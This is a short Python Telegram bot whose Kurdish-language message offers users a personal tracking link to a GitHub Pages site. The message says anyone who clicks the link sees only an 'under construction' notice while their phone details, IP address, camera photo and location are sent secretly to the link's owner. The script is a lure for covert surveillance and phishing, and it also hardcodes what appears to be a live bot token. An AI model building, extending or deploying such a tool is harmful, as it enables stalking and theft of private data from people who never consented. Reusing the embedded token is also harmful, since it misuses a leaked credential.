import os
import random
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY"
BASE_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    
    # لینکی ڕاستەوخۆ بێ سێرڤەری کورتکردنەوە
    link = f"{BASE_URL}?ref={random_str}&id={user_id}"

    text = (
        "بەخێربێیت!\n\n"
        "🔗 **لینکی تایبەتی تۆ ئامادەیە:**\n"
        f"`{link}`\n\n"
        "ئەم لینکە بنێرە بۆ هەر کەسێک. کاتێک کەسەکە کلیکی لەسەر دەکات:\n"
        "1. بۆ ئەو تەنها پەیامی 'ماڵپەڕەکە لەژێر کارکردندایە' نیشان دەدرێت.\n"
        "2. تەواوی زانیارییەکانی (مۆبایل، IP، وێنەی کامێرا و شوێن) ڕاستەوخۆ بۆ تۆ دێت!"
    )

    await update.message.reply_text(text, parse_mode='Markdown')

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("بۆتەکە چالاک بوو...")
    app.run_polling()

if __name__ == "__main__":
    main()
